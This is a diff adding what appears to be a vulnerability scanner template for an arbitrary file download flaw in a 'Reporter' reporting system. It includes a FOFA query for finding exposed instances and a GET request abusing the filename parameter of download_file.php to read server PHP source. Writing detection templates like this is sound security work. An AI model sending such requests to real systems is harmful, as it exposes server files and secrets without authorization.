@@ -1,0 +1,15 @@
+id: poc-yaml-reporter-report-system-anyfile-download
+info:
+  name: Reporter报表系统 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Reporter
+  fofa: title="Login @ Reporter"
+requests:
+- method: GET
+  path: /view/action/download_file.php?filename=download_file.php
+  expression: status_code == 200 && contains(body,"<?php") && contains(body,"filename=")
+    && contains(headers,"application/octet-stream")
+variables: {}
+transport: http
